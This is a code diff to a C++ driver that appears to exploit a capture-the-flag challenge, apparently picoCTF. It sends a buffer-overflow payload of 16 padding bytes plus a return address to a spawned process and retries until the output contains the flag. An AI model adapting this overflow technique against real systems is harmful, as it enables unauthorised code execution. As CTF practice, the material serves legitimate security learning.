@@ -60,6 +60,21 @@ void cmdout(int x){
 	write(outpipefd[1], s.c_str(), (int)s.size());
 }
 
+string cmdflag(string s, string f = "pico"){
+	string ret = "";
+	while(ret.find(f) == string::npos){
+		runcmd();
+		cmdin();
+		cmdout(s.size());
+		cmdin();
+		cmdout(s);
+		read(2, buf, 256);
+		ret = string(buf);
+		killcmd();
+	}
+	return ret;
+}
+
 int main(){
 	ios::sync_with_stdio(false);
 	cin.tie(NULL);
@@ -84,17 +99,9 @@ int main(){
 		}
 	}
 	
-	s += string(16, 'a') + "\xed\x07";
+	s += string(16, 'a') + "\xed\x07\x00\x00";
 	
-	runcmd();
-	t = cmdin();
-	cmdout(s.size() + 2);
-	t = cmdin();
-	cmdout(s);
-	t = cmdin();
-	killcmd();
-	
-	cout << t << endl;
+	cout << cmdflag(s) << endl;
 
 	return 0;
 }
